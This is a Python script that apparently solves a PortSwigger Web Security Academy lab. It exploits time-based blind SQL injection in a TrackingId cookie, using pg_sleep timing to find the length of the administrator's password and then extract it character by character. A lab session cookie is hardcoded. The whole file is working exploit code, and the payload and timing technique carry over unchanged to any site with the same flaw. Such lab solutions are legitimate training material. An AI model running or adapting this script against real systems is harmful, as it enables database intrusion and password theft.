import requests
import time
import sys

class SolveSqli:
    
    def __init__(self):
        self.passLenght = 0
        self.url = "https://0aed00a304b7d6c5813ff2e100830019.web-security-academy.net/filter?category=Tech+gifts"

    def runRequest(self, TrackingId="", check=""):
        try:
            resp = requests.get(self.url, cookies={"TrackingId":TrackingId, "session":"4DTU7yCuVgDkEa1Z77MhyVYbd9ZnISyJ"}, timeout=5)
            return False
        except requests.exceptions.ReadTimeout as e:
            return True
        
    def getPassLenght(self):
        for i in range(1,100):
            TrackingId=f"9rnCfZEDaDwNOKD3'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)=>{i})+THEN+pg_sleep(20)+ELSE+pg_sleep(0)+END+FROM+users--"
            resp = self.runRequest(TrackingId=TrackingId, check="Welcome back!")
            sys.stdout.write(f"\r\rTrying Password Lenght  {i}")
            sys.stdout.flush()
            # time.sleep(0.01)
            if resp == True:
                self.passLenght = i
            else:
                sys.stdout.write(f"\r\r\nFound pass lenght is : {self.passLenght}\n")
                sys.stdout.flush()
                # time.sleep(0.01)
                break

    def bruteForcePassword(self):
        password = ""
        charset = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        for i in range(21):
            for char in charset:
                TrackingId=f"9rnCfZEDaDwNOKD3'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,{i},1)='{char}')+THEN+pg_sleep(20)+ELSE+pg_sleep(0)+END+FROM+users--"
                res = self.runRequest(TrackingId=TrackingId, check="Welcome back!")
                sys.stdout.write(f"\r\rTrying {char} at index {i} : payload : {TrackingId}")
                sys.stdout.flush()
                if res == True:
                    # sys.stdout.write(f"\r\rFound {i} - {char} \n")
                    # sys.stdout.flush()
                    password += char
                    break
            if password == "":
                print("First Char not found please exit and check you script and pyload") #raise Exception('Some thing wrong with the script')
        print("PAssword Found : "+password if password!="" else "Password Not Found")





x = SolveSqli()
x.getPassLenght()
x.bruteForcePassword()